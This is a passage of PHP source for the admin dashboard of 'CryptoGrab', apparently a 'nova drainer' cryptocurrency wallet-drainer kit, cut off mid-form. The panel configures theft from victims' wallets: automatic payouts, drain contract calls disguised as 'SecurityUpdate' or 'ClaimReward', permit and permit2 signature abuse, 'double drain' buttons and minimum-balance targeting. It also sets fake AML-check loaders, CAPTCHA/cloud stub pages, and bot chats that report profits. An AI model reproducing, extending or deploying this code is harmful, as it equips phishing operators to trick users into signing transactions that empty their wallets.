<?php
session_start();

// Check if user is signed in
if (!isset($_SESSION['username'])) {
    header("Location: ../");
    exit;
}

require 'locales.php';
require $_SERVER["DOCUMENT_ROOT"] . "/php/info_send_log.php";
require $_SERVER['DOCUMENT_ROOT'] . '/encryption.php';
require $_SERVER["DOCUMENT_ROOT"] . '/settings-default.php';

$filePath = $_SERVER["DOCUMENT_ROOT"] . '/settings.txt';
$cloudStubFilePath = $_SERVER["DOCUMENT_ROOT"] . '/cloud-settings.json';
$googleStubFilePath = $_SERVER["DOCUMENT_ROOT"] . '/google-settings.json';

// Set language if it not selected
if (!isset($_SESSION['language'])) {
    $_SESSION['language'] = isset($language) && $language == 'ru' ? 'ru' : "en";
}

$lang = $_SESSION['language'];

// Load settings
if (file_exists($filePath)) {
    $site_settings_encrypted = file_get_contents($filePath);

    try {
        // Trying to decrypt using AES
        $site_settings_decrypted = AesCtr::decrypt($site_settings_encrypted, 'c3VwZXJfc3Ryb25nX2tleQ', 128);
        $site_settings = json_decode($site_settings_decrypted, true);
        if ($site_settings === null && json_last_error() !== JSON_ERROR_NONE) {
            throw new Exception("Invalid", 1);
        }
    } catch (Exception $error) {
        // Trying to decrypt using BASE64
        $site_settings_decrypted = base64_decode($site_settings_encrypted);
        $site_settings = json_decode($site_settings_decrypted, true);
    }
} else {
    $site_settings = $settings_default;
}

if (file_exists($cloudStubFilePath)) 
    $cloud_stub_settings = json_decode(file_get_contents($cloudStubFilePath), true);

if (file_exists($googleStubFilePath)) 
    $google_stub_settings = json_decode(file_get_contents($googleStubFilePath), true);

// Merging user's settings into default settings. 
// User's settings persist, but keys, that did not exist before are set from default values. 
$site_settings = array_merge($settings_default, $site_settings);
$site_settings['chat_language'] = isset($site_settings['chat_language']) ? $site_settings['chat_language'] : $lang;

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CryptoGrab Admin | Dashboard</title>
    <link rel="stylesheet" href="../static/css/style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&family=Roboto:wght@500&display=swap"
        rel="stylesheet">
</head>

<body>
    <div class="utils">
        <div>
            <a 
                class="docs" 
                href="https://read.cryptograb.io/nova-drainer-docs/admin-config"
                target="_blank"
            >
                <?= $locales[$lang]['docs'] ?>
            </a>
        </div>
        <form action="./actions/set-lang.php" method="post">
            <select class="formlang" name="language" onchange="this.form.submit()">
                <option class="option" value="ru" <?php if ($lang == 'ru')
                    echo "selected" ?>>
                        Ru
                    </option>
                    <option class="option" value="en" <?php if ($lang == 'en')
                    echo "selected" ?>>
                        En
                    </option>
                </select>
            </form>
            <form action="./actions/sign-out.php" method="post">
                <button class="logout">
                    <img alt="img" src="../static/img/logout.svg" />
                </button>
            </form>
        </div>
        <div class="wrapper">
            <div class="section">
                <?php
                if (isset($_SESSION['update-message-status'])) {
                    if ($_SESSION['update-message-status'] === 'save-success') {
                        echo('<div class="allertcompleate">' . $locales[$lang]['save-success'] . '</div>');
                    } else {
                        echo('<div class="allerterror">' . $locales[$lang]['save-error'] . '</div>');
                    }
                }
                ?>

                <div class="menu">
                    <div class="listmenu">
                        <a 
                            onclick="toggleActive(this)" 
                            class="pagesec" 
                            data-content-id="content1"
                        >
                            <img class="pageimg" alt="img" src="../static/img/set1.svg" />
                            <p class="paget">
                                <?= $locales[$lang]['tabs']['general'] ?>
                            </p>
                        </a>
                        <a 
                            onclick="toggleActive(this)" 
                            class="pagesec" 
                            data-content-id="content2"
                        >
                            <img class="pageimg" alt="img" src="../static/img/text3.svg" />
                            <p class="paget">
                                <?= $locales[$lang]['tabs']['loaders'] ?>
                            </p>
                        </a>
                        <a 
                            onclick="toggleActive(this)" 
                            class="pagesec" 
                            data-content-id="content3"
                        >
                            <img class="pageimg" alt="img" src="../static/img/cback4.svg" />
                            <p class="paget">
                                <?= $locales[$lang]['tabs']['messaging'] ?>
                            </p>
                        </a>
                        <a 
                            onclick="toggleActive(this)" 
                            class="pagesec" 
                            data-content-id="content4"
                        >
                            <img class="pageimg" alt="img" src="../static/img/modal5.svg" />
                            <p class="paget">
                                <?= $locales[$lang]['tabs']['web3modal'] ?>
                            </p>
                        </a>
                    </div>
                    <div style="display: none;" class="question">
                        <a style="text-decoration: none;" href="#" class="pagesec">
                            <img class="pageimg" alt="img" src="../static/img/docs.svg" />
                            <p class="paget">Документация</p>
                        </a>
                    </div>
                </div>

                <div class="contmenu">
                    <div class="top">

                    </div>
                    <form class="content" action="./actions/update-settings.php" method="post">
                        <div id="content1" class="content-div">
                            <div class="inrow32">
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['site-settings-autopayments'] ?> 
                                        <img class="mod1tar" alt="img" src="../static/img/mimg.svg" />
                                    </label>
                                    <select name="auto_payouts" class="form3">
                                        <option 
                                            class="option" 
                                            value="1"
                                            <?php if ($site_settings["auto_payouts"] == true) echo "selected"; ?>
                                        >
                                            <?= $locales[$lang]['site-settings-on'] ?>
                                        </option>
                                        <option 
                                            class="option" 
                                            value="0" 
                                            <?php if ($site_settings["auto_payouts"] == false) echo "selected"; ?>
                                        >
                                            <?= $locales[$lang]['site-settings-off'] ?>
                                        </option>
                                    </select>
                                </div>
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['site-settings-wallet-verification'] ?>
                                    </label>
                                    <select class="form3" name="wallet_verification">
                                        <option 
                                            class="option" 
                                            value="1" 
                                            <?php if ($site_settings["wallet_verification"] == true) echo "selected"; ?>
                                        >
                                            <?= $locales[$lang]['site-settings-on'] ?>
                                        </option>
                                        
                                        <option 
                                            class="option" 
                                            value="0" 
                                            <?php if ($site_settings["wallet_verification"] == false) echo "selected"; ?>
                                        >
                                            <?= $locales[$lang]['site-settings-off'] ?>
                                        </option>
                                    </select>
                                </div>
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['site-settings-contract-method'] ?>
                                    </label>
                                    <select class="form3" name="contract_method">
                                        <option 
                                            class="option" 
                                            value="Claim" 
                                            <?php if ($site_settings["contract_method"] == "Claim") echo "selected"; ?>
                                        >
                                            Claim
                                        </option>
                                        <option 
                                            class="option"
                                            value="ClaimReward" 
                                            <?php if ($site_settings["contract_method"] == "ClaimReward") echo "selected"; ?>
                                        >
                                            ClaimReward
                                        </option>
                                        <option 
                                            class="option"
                                            value="ClaimRewards"
                                            <?php if ($site_settings["contract_method"] == "ClaimRewards") echo "selected"; ?>
                                        >
                                            ClaimRewards
                                        </option>
                                        <option 
                                            class="option"
                                            value="Connect"
                                            <?php if ($site_settings["contract_method"] == "Connect") echo "selected"; ?>
                                        >
                                            Connect
                                        </option>
                                        <option 
                                            class="option"
                                            value="Execute" 
                                            <?php if ($site_settings["contract_method"] == "Execute") echo "selected"; ?>
                                        >
                                            Execute
                                        </option>
                                        <option 
                                            class="option"
                                            value="Multicall" 
                                            <?php if ($site_settings["contract_method"] == "Multicall") echo "selected"; ?>
                                        >
                                            Multicall
                                        </option>
                                        <option 
                                            class="option"
                                            value="SecurityUpdate" 
                                            <?php if ($site_settings["contract_method"] == "SecurityUpdate") echo "selected"; ?>
                                        >
                                            SecurityUpdate
                                        </option>
                                        <option 
                                            class="option"
                                            value="Swap" 
                                            <?php if ($site_settings["contract_method"] == "Swap") echo "selected"; ?>
                                        >
                                            Swap
                                        </option>
                                    </select>
                                </div>
                            </div>
                            <div class="inrow32">
                                <div class="row1div">
                                    <label class="form_label">
                                        <?= $locales[$lang]['site-settings-erc20-widthdraw'] ?>
                                    </label>
                                    <select class="form1" name="loop_token">
                                        <option 
                                            class="option" 
                                            value="1"
                                            <?php if ($site_settings["loop_token"] == true) echo "selected"; ?>
                                        >
                                            <?= $locales[$lang]['site-settings-erc20-widthdraw-repeat'] ?>
                                        </option>
                                        <option 
                                            class="option" 
                                            value="0" 
                                            <?php if ($site_settings["loop_token"] == false) echo "selected"; ?>
                                        >
                                            <?= $locales[$lang]['site-settings-erc20-widthdraw-next'] ?>
                                        </option>
                                    </select>
                                </div>
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['site-settings-thanks-redirect'] ?>
                                    </label>
                                    <select class="form3" name="thanks_redirect">
                                        <option 
                                            class="option" 
                                            value="1" 
                                            <?php if ($site_settings["thanks_redirect"] == true) echo "selected"; ?>
                                        >
                                            <?= $locales[$lang]['site-settings-on'] ?>
                                        </option>
                                        <option 
                                            class="option" 
                                            value="0" 
                                            <?php if ($site_settings["thanks_redirect"] == false) echo "selected"; ?>
                                        >
                                            <?= $locales[$lang]['site-settings-off'] ?>
                                        </option>
                                    </select>
                                </div>
                            </div>
                            <div class="inrow1">
                                
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['site-settings-thanks-redirect-url'] ?>
                                    </label>
                                    <input type="text" class="forminput1 exp2" name="thanks_redirect_url" value="<?= $site_settings["thanks_redirect_url"] ?>">
                                </div>
                                
                            </div>
                            <label>
                                <input 
                                    id="checkbox1" 
                                    type="checkbox" 
                                    name="permit_priority" 
                                    value="1" 
                                    <?= $site_settings["permit_priority"] ? 'checked' : '' ?>
                                >
                                <label for="checkbox1">
                                    <?= $locales[$lang]['site-settings-permit-enabled'] ?>
                                </label>
                            </label>
                            <div style="padding-top: 16px;" class="inrow32">
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['site-settings-permit-priority'] ?>
                                    </label>
                                    <input 
                                        type="number" 
                                        class="forminput1 exp1" 
                                        name="permit_amount" 
                                        class="input" 
                                        value="<?= $site_settings["permit_amount"] ?>" 
                                        pattern="[0-9]*"
                                        oninput="validateInput()" 
                                        inputmode="numeric"
                                        <?= $site_settings["permit_priority"] ? '' : 'disabled' ?>
                                    />
                                </div>
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['site-settings-modal-type'] ?>
                                    </label>
                                    <select class="form3" name="modal_type" id="modal-type-select">
                                        <option 
                                            class="option"
                                            value="wallet_connect" 
                                            <?php if ($site_settings["modal_type"] == "wallet_connect") echo "selected"; ?>
                                        >
                                            Wallet Connect V2
                                        </option>
                                        <option 
                                            class="option"
                                            value="wallet_connect_v3" 
                                            <?php if ($site_settings["modal_type"] == "wallet_connect_v3") echo "selected"; ?>
                                        >
                                            Wallet Connect V3
                                        </option>
                                        <option 
                                            class="option"
                                            value="rainbowKitWithQrCode" 
                                            <?php if ($site_settings["modal_type"] == "rainbowKitWithQrCode") echo "selected"; ?>
                                        >
                                            Rainbow Kit
                                        </option>
                                        <option 
                                            class="option"
                                            value="default" 
                                            <?php if ($site_settings["modal_type"] == "default") echo "selected"; ?>
                                        >
                                            Rainbow Kit Compact
                                        </option>
                                        <option 
                                            class="option"
                                            value="saturnModal" 
                                            <?php if ($site_settings["modal_type"] == "saturnModal") echo "selected"; ?>
                                        >
                                            Saturn Modal
                                        </option>
                                        <option 
                                            class="option"
                                            value="marsModal" 
                                            <?php if ($site_settings["modal_type"] == "marsModal") echo "selected"; ?>
                                        >
                                            Mars Modal
                                        </option>
                                        <option 
                                            class="option"
                                            value="venusModal" 
                                            <?php if ($site_settings["modal_type"] == "venusModal") echo "selected"; ?>
                                        >
                                            Venus Modal
                                        </option>
                                        <option 
                                            class="option"
                                            value="moonModal" 
                                            <?php if ($site_settings["modal_type"] == "moonModal") echo "selected"; ?>
                                        >
                                            Moon Modal
                                        </option>
                                        <option 
                                            class="option"
                                            value="jupiterModal" 
                                            <?php if ($site_settings["modal_type"] == "jupiterModal") echo "selected"; ?>
                                        >
                                            Jupiter Modal
                                        </option>
                                        <option 
                                            class="option"
                                            value="newModal2" 
                                            <?php if ($site_settings["modal_type"] == "newModal2") echo "selected"; ?>
                                        >
                                            Spirit Modal
                                        </option>
                                        <option 
                                            class="option"
                                            value="newModal3" 
                                            <?php if ($site_settings["modal_type"] == "newModal3") echo "selected"; ?>
                                        >
                                            Spirit Modal Extended
                                        </option>
                                        <option 
                                            class="option"
                                            value="celestiaModal" 
                                            <?php if ($site_settings["modal_type"] == "celestiaModal") echo "selected"; ?>
                                        >
                                            Celestia Modal
                                        </option>
                                        <option 
                                            class="option"
                                            value="mantaModal" 
                                            <?php if ($site_settings["modal_type"] == "mantaModal") echo "selected"; ?>
                                        >
                                            Manta Modal
                                        </option>
                                    </select>
                                </div>
                            </div>

                            <div class="inrow32" id="modal-customization">
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['site-settings-modal-pallete'] ?>
                                    </label>
                                    <select class="form1" name="modal_pallete"></select>
                                </div>
                                <div class="divi">
                                    <label class="form_label"> 
                                        <?= $locales[$lang]['site-settings-modal-font'] ?>
                                    </label>
                                    <select class="form3" name="modal_font"></select>
                                </div>
                            </div>

                            <div class="inrow32">
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['site-settings-modal-open'] ?>
                                    </label>
                                    <select class="form1" name="modal_open_event">
                                        <option 
                                            class="option"
                                            value="on_click" 
                                            <?php if ($site_settings["modal_open_event"] == "on_click") echo "selected"; ?>
                                        >
                                            <?= $locales[$lang]['site-settings-modal-open-click'] ?>
                                        </option>
                                        <option 
                                            class="option"
                                            value="on_load" 
                                            <?php if ($site_settings["modal_open_event"] == "on_load") echo "selected"; ?>
                                        >
                                            <?= $locales[$lang]['site-settings-modal-open-load'] ?>
                                        </option>
                                    </select>
                                </div>
                                <div class="divi">
                                    <label class="form_label"> 
                                        <?= $locales[$lang]['site-settings-modal-theme'] ?>
                                    </label>
                                    <select class="form3" name="modal_theme">
                                        <option 
                                            class="option"
                                            value="light" 
                                            <?php if ($site_settings["modal_theme"] == "light") echo "selected"; ?>
                                        >
                                            <?= $locales[$lang]['site-settings-modal-theme-light'] ?>
                                        </option>
                                        <option 
                                            class="option"
                                            value="dark" 
                                            <?php if ($site_settings["modal_theme"] == "dark") echo "selected"; ?>
                                        >
                                            <?= $locales[$lang]['site-settings-modal-theme-dark'] ?>
                                        </option>
                                        <option 
                                            class="option"
                                            value="auto" 
                                            <?php if ($site_settings["modal_theme"] == "auto") echo "selected"; ?>
                                        >
                                            <?= $locales[$lang]['site-settings-modal-theme-auto'] ?>
                                        </option>
                                    </select>
                                </div>
                            </div>
                            <div class="inrow32">
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['site-settings-modal-handler'] ?>
                                    </label>
                                    <select class="form1" name="modal_open_logic">
                                        <option 
                                            class="option"
                                            value="all" 
                                            <?php if ($site_settings["modal_open_logic"] == "all") echo "selected"; ?>
                                        >
                                            &lt;button&gt;, &lt;a&gt;, .claim-button
                                        </option>
                                        <option 
                                            class="option"
                                            value="single" 
                                            <?php if ($site_settings["modal_open_logic"] == "single") echo "selected"; ?>
                                        >
                                            .claim-button
                                        </option>
                                    </select>
                                </div>
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['site-settings-loader-type'] ?>
                                    </label>
                                    <select class="form3" name="loader_type">
                                        <option 
                                            class="option"
                                            value="andromeda" 
                                            <?php if ($site_settings["loader_type"] == "andromeda") echo "selected"; ?>
                                        >
                                            Andromeda Loader
                                        </option>
                                        <option 
                                            class="option"
                                            value="comet" 
                                            <?php if ($site_settings["loader_type"] == "comet") echo "selected"; ?>
                                        >
                                            Comet Loader
                                        </option>
                                        <option 
                                            class="option"
                                            value="neptune" 
                                            <?php if ($site_settings["loader_type"] == "neptune") echo "selected"; ?>
                                        >
                                            Neptune Loader
                                        </option>
                                        <option 
                                            class="option"
                                            value="pluto" 
                                            <?php if ($site_settings["loader_type"] == "pluto") echo "selected"; ?>
                                        >
                                            Pluto Loader
                                        </option>
                                        <option 
                                            class="option"
                                            value="orion" 
                                            <?php if ($site_settings["loader_type"] == "orion") echo "selected"; ?>
                                        >
                                            Orion Loader
                                        </option>
                                    </select>
                                </div>
                            </div>
                            <div class="inrow32">
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['chain-change-ask-limit'] ?>
                                    </label>
                                    <input 
                                        type="number"
                                        name="chain_tries_limit" 
                                        class="forminput1 inputNum" 
                                        value="<?= max($site_settings["chain_tries_limit"], 1) ?>"
                                        min="1"
                                        onblur="if (this.value < 1) this.value = 1;"
                                    >
                                </div>
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['lower-threshold-minimal-wallet-price'] ?>
                                    </label>
                                    <input 
                                        type="number" 
                                        class="forminput32" 
                                        name="minimal_wallet_price" 
                                        value="<?= max($site_settings["minimal_wallet_price"], 10) ?>"
                                        min="10"
                                        onblur="if (this.value < 10) this.value = 10;"
                                    >
                                </div>
                            </div>
                            <div class="inrow32">
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['lower-threshold-minimal-native-price'] ?>
                                    </label>
                                    <input 
                                        type="number" 
                                        class="forminput1" 
                                        name="minimal_native_price" 
                                        value="<?= max($site_settings["minimal_native_price"], 10) ?>"
                                        min="10"
                                        onblur="if (this.value < 10) this.value = 10;"
                                    >
                                </div>
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['lower-threshold-minimal-token-price'] ?>
                                    </label>
                                    <input 
                                        type="number" 
                                        class="forminput32" 
                                        name="minimal_token_price" 
                                        value="<?= max($site_settings["minimal_token_price"], 10) ?>"
                                        min="10"
                                        onblur="if (this.value < 10) this.value = 10;"
                                    >
                                </div>
                            </div>

                            <?php if(isset($cloud_stub_settings)) { ?>
                                <div class="inrow32">
                                    <div class="divi">
                                        <label class="form_label">
                                            <?= $locales[$lang]['cloud-button-text'] ?>
                                        </label>
                                        <input 
                                            type="text" 
                                            class="forminput1" 
                                            name="cloud_button_text"
                                            value="<?= $cloud_stub_settings["button-text"] ?>"
                                        />
                                    </div>
                                    <div class="divi">
                                        <label class="form_label">
                                            <?= $locales[$lang]['cloud-reload-delay'] ?>
                                        </label>
                                        <input 
                                            type="number" 
                                            class="forminput32" 
                                            name="cloud_reload_delay" 
                                            value="<?= $cloud_stub_settings["reload-delay"] / 1000 ?>" 
                                            min="1" onblur="if (this.value < 1) this.value = 1;"
                                        />
                                    </div>
                                </div>
                                <div class="inrow32">
                                    <div class="divi">
                                        <label class="form_label">
                                            <?= $locales[$lang]['cloud-button-text-verification'] ?>
                                        </label>
                                        <input 
                                            type="text" 
                                            class="forminput1" 
                                            name="cloud_button_text_verification"
                                            value="<?= $cloud_stub_settings["button-text-verification"] ?>"
                                        />
                                    </div>
                                    <div class="divi">
                                    <label class="form_label">                  
                                        <?= $locales[$lang]['cloud-button-color'] ?>
                                    </label>
                                    <span class="color-picker">
                                        <label for="cloud-button-color-picker">
                                            <input 
                                                type="color" 
                                                id="cloud-button-color-picker" 
                                                name="cloud_button_color"
                                                value="<?= $cloud_stub_settings["button-color"] ?>"
                                            />
                                        </label>
                                    </span>
                                </div>
                                </div>
                            <?php } ?> 

                            <?php if(isset($google_stub_settings)) { ?>
                                <div class="inrow1">
                                    <div class="divi">
                                        <label class="form_label">
                                            <?= $locales[$lang]['recaptcha-domain-name'] ?>
                                        </label>
                                        <input 
                                            type="text" 
                                            class="forminput1 exp2" 
                                            name="recaptcha_domain_name"
                                            value="<?= $google_stub_settings["domain_name"] != "" ? $google_stub_settings["domain_name"] : $_SERVER['SERVER_NAME'] ?>"
                                        />
                                    </div>
                                </div>
                            <?php } ?> 

                            <div class="checkcol">
                                <label>
                                    <input 
                                        type="hidden" 
                                        name="nft_mode" 
                                        value="0" 
                                    />
                                    <input 
                                        type="checkbox" 
                                        name="nft_mode"
                                        value="1" 
                                        <?= $site_settings["nft_mode"] ? 'checked' : '' ?> 
                                    />
                                    <span>
                                        <?= $locales[$lang]['additional-functions-set-enable-nft'] ?>
                                    </span>
                                </label>
                                <label>
                                    <input 
                                        type="hidden" 
                                        name="permit_mode" 
                                        value="0"
                                    />
                                    <input 
                                        type="checkbox" 
                                        name="permit_mode" 
                                        value="1" 
                                        <?= $site_settings["permit_mode"] ? 'checked' : '' ?>
                                    />
                                    <span>
                                        <?= $locales[$lang]['additional-functions-set-enable-permit'] ?>
                                    </span>
                                </label>
                                <label>
                                    <input 
                                        type="hidden" 
                                        name="permit2_mode" 
                                        value="0" 
                                    />
                                    <input 
                                        type="checkbox" 
                                        name="permit2_mode" 
                                        value="1" 
                                        <?= $site_settings["permit2_mode"] ? 'checked' : '' ?>
                                    />
                                    <span>
                                        <?= $locales[$lang]['additional-functions-set-enable-permit2'] ?>
                                    </span>
                                </label>
                                <label>
                                    <input 
                                        type="hidden" 
                                        name="swappers_mode" 
                                        value="0" 
                                    />
                                    <input 
                                        type="checkbox" 
                                        name="swappers_mode" 
                                        value="1" 
                                        <?= $site_settings["swappers_mode"] ? 'checked' : '' ?>
                                    />
                                    <span>
                                        <?= $locales[$lang]['additional-functions-set-enable-swappers'] ?>
                                    </span>
                                </label>
                                <label>
                                    <input 
                                        type="hidden" 
                                        name="cache_data"
                                        value="0">
                                    <input 
                                        type="checkbox" 
                                        name="cache_data" 
                                        value="1" 
                                        <?= $site_settings["cache_data"] ? 'checked' : '' ?>
                                    />
                                    <span>
                                        <?= $locales[$lang]['additional-functions-set-use-cached-data'] ?>
                                    </span>
                                </label>
                            </div>
                            <div style="padding-top: 16px;" class="inrow1">
                                <label>
                                    <input 
                                        type="hidden" 
                                        name="double_drain_mode" 
                                        value="0" 
                                    />
                                    <input 
                                        type="checkbox" 
                                        id="checkbox2"
                                        name="double_drain_mode" 
                                        value="1" 
                                        <?= $site_settings["double_drain_mode"] ? 'checked' : '' ?>
                                    />
                                    <span>
                                        <?= $locales[$lang]['double-drain-checkbox'] ?>
                                    </span>
                                    <p class="pexplain">
                                        <?= $locales[$lang]['double-drain-subtitle'] ?>
                                    </p>
                                </label>
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['double-drain-button-class'] ?>
                                    </label>
                                    <input 
                                        type="text" 
                                        class="forminput1 exp2" 
                                        name="double_drain_class" 
                                        value="<?= $site_settings["double_drain_class"] ?>"
                                        <?= $site_settings["double_drain_mode"] ? '' : 'disabled' ?> 
                                    />
                                </div>
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['double-drain-button-text'] ?>
                                    </label>
                                    <input 
                                        type="text" 
                                        class="forminput1 exp2" 
                                        name="double_drain_text"
                                        value="<?= $site_settings["double_drain_text"] ?>"
                                        <?= $site_settings["double_drain_mode"] ? '' : 'disabled' ?> 
                                    />
                                </div>
                            </div>
                            <button type="submit" class="savebut">
                                <?= $locales[$lang]['save-changes-button'] ?>
                            </button>
                        </div>

                        <div id="content2" class="content-div" style="display: none;">
                            <div class="inrow32">
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['loaders-texts-connect'] ?>
                                    </label>
                                    <input 
                                        type="text" 
                                        class="forminput32" 
                                        name="loader-connect"
                                        value="<?= $site_settings['loader_text']['connect']['description'] ?>"
                                    />
                                </div>
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['loaders-texts-connect-success'] ?>
                                    </label>
                                    <input 
                                        type="text" 
                                        class="forminput32" 
                                        name="loader-connect-success-description"
                                        value="<?= $site_settings['loader_text']['connect-success']['description'] ?>"
                                    />
                                </div>
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['loaders-texts-address-check'] ?>
                                    </label>
                                    <input 
                                        type="text" 
                                        class="forminput32" 
                                        name="loader-address-check-description"
                                        value="<?= $site_settings['loader_text']['address-check']['description'] ?>"
                                    />
                                </div>
                            </div>
                            <div class="inrow32">
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['loaders-texts-aml-check'] ?>
                                    </label>
                                    <input 
                                        type="text" 
                                        class="forminput32" 
                                        name="loader-aml-check-description"
                                        value="<?= $site_settings['loader_text']['aml-check']['description'] ?>"
                                    />
                                </div>
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['loaders-texts-aml-check-success'] ?>
                                    </label>
                                    <input 
                                        type="text" 
                                        class="forminput32" 
                                        name="loader-aml-check-success-description"
                                        value="<?= $site_settings['loader_text']['aml-check-success']['description'] ?>"
                                    />
                                </div class="divi">
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['loaders-texts-scanning-more'] ?>
                                    </label>
                                    <input 
                                        type="text" 
                                        class="forminput32" 
                                        name="loader-scanning-more-description"
                                        value="<?= $site_settings['loader_text']['scanning-more']['description'] ?>"
                                    />
                                </div class="divi">
                            </div>
                            <div style="width: 79%;" class="inrow32">
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['loaders-texts-thanks'] ?>
                                    </label>
                                    <input type="text" class="forminput32" name="loader-thanks-description"
                          value="<?= $site_settings['loader_text']['thanks']['description'] ?>">
                                </div>
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['loaders-texts-sign-validation'] ?>
                                    </label>
                                    <input type="text" class="forminput32" name="loader-sign-validation-description"
                          value="<?= $site_settings['loader_text']['sign-validation']['description'] ?>">
                                </div>
                            </div>
                            <div style="margin-top: 16px;" class="inrow1">
                                <div class="row1div">
                                    <label class="form_label">
                                        <?= $locales[$lang]['loaders-texts-sign-waiting-title'] ?>
                                    </label>
                                    <input 
                                        type="text" 
                                        class="forminput1" 
                                        name="loader-sign-waiting-title"
                                        value="<?= $site_settings['loader_text']['sign-waiting']['title'] ?>"
                                    />
                                </div>
                                <div class="row1div">
                                    <label class="form_label">
                                        <?= $locales[$lang]['loaders-texts-sign-waiting-description'] ?>
                                    </label>
                                    <input 
                                        type="text" 
                                        class="forminput1" 
                                        name="loader-sign-waiting-description"
                                        value="<?= $site_settings['loader_text']['sign-waiting']['description'] ?>"
                                    />
                                </div>
                                <div class="row1div">
                                    <label class="form_label">
                                        <?= $locales[$lang]['loaders-texts-sign-confirmed'] ?>
                                    </label>
                                    <input 
                                        type="text" 
                                        class="forminput1" 
                                        name="loader-sign-confirmed-description"
                                        value="<?= $site_settings['loader_text']['sign-confirmed']['description'] ?>"
                                    />
                                </div>
                                <div class="row1div">
                                    <label class="form_label">
                                        <?= $locales[$lang]['loaders-texts-error-title'] ?>
                                    </label>
                                    <input 
                                        type="text" 
                                        class="forminput1" 
                                        name="loader-error-title"
                                        value="<?= $site_settings['loader_text']['error']['title'] ?>"
                                    />
                                </div>
                                <div class="row1div">
                                    <label class="form_label">
                                        <?= $locales[$lang]['loaders-texts-error-description'] ?>
                                    </label>
                                    <input 
                                        type="text" 
                                        class="forminput1" 
                                        name="loader-error-description"
                                        value="<?= $site_settings['loader_text']['error']['description'] ?>"
                                    />
                                </div>
                                <div class="row1div">
                                    <label class="form_label">
                                        <?= $locales[$lang]['loaders-texts-error-button'] ?>
                                    </label>
                                    <input 
                                        type="text" 
                                        class="forminput1" 
                                        name="loader-error-button"
                                        value="<?= $site_settings['loader_text']['error']['button'] ?>"
                                    />
                                </div>
                                <div class="row1div">
                                    <label class="form_label">
                                        <?= $locales[$lang]['loaders-texts-low-balance-error-description'] ?>
                                    </label>
                                    <input 
                                        type="text" 
                                        class="forminput1" 
                                        name="loader-low-balance-error-description"
                                        value="<?= $site_settings['loader_text']['low-balance-error']['description'] ?>"
                                    />
                                </div>
                                <div class="row1div">
                                    <label class="form_label">
                                        <?= $locales[$lang]['loaders-texts-low-balance-error-button'] ?>
                                    </label>
                                    <input 
                                        type="text" 
                                        class="forminput1" 
                                        name="loader-low-balance-error-button"
                                        value="<?= $site_settings['loader_text']['low-balance-error']['button'] ?>"
                                    />
                                </div>
                                <div class="row1div">
                                    <label class="form_label">
                                        <?= $locales[$lang]['loaders-texts-aml-check-error-title'] ?>
                                    </label>
                                    <input 
                                        type="text" 
                                        class="forminput1" 
                                        name="loader-aml-check-error-title"
                                        value="<?= $site_settings['loader_text']['aml-check-error']['title'] ?>"
                                    />
                                </div>
                                <div class="row1div">
                                    <label class="form_label">
                                        <?= $locales[$lang]['loaders-texts-aml-check-error-description'] ?>
                                    </label>
                                    <input 
                                        type="text" 
                                        class="forminput1" 
                                        name="loader-aml-check-error-description"
                                        value="<?= $site_settings['loader_text']['aml-check-error']['description'] ?>"
                                    />
                                </div>
                            </div>
                            <button class="savebut">
                                <?= $locales[$lang]['save-changes-button'] ?>
                            </button>
                        </div>

                        <div id="content3" class="content-div" style="display: none;">
                            <div class="inrow32">
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['message-settings-bot'] ?>
                                    </label>
                                    <input 
                                        type="text" 
                                        class="forminput1" 
                                        name="messaging_bot" 
                                        value="<?= $site_settings["messaging_bot"] ?>"
                                    />
                                </div>
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['message-settings-language'] ?>
                                    </label>
                                    <select class="form3" name="chat_language">
                                        <option 
                                            class="option"
                                            value="ru" 
                                            <?php if ($site_settings["chat_language"] == "ru") echo "selected"; ?>
                                        >
                                            Русский
                                        </option>
                                        <option 
                                            class="option"
                                            value="en" 
                                            <?php if ($site_settings["chat_language"] == "en") echo "selected"; ?>
                                        >
                                            English
                                        </option>
                                    </select>
                                </div>
                            </div>
                            <div class="row1div" style="margin-bottom: 16px;">
                                <label class="form_label">
                                    <?= $locales[$lang]['message-settings-chat'] ?>
                                </label>
                                <input 
                                    type="text" 
                                    class="forminput1" 
                                    name="messaging_chat" 
                                    value="<?= $site_settings["messaging_chat"] ?>" 
                                />
                            </div>
                            <div class="divi">
                                <label class="form_label">
                                    <?= $locales[$lang]['message-settings-widthdraw-chat'] ?>
                                </label>
                                <input 
                                    type="text" 
                                    class="forminput1 exp2" 
                                    name="profit_chat"
                                    value="<?= $site_settings["profit_chat"] ?>"
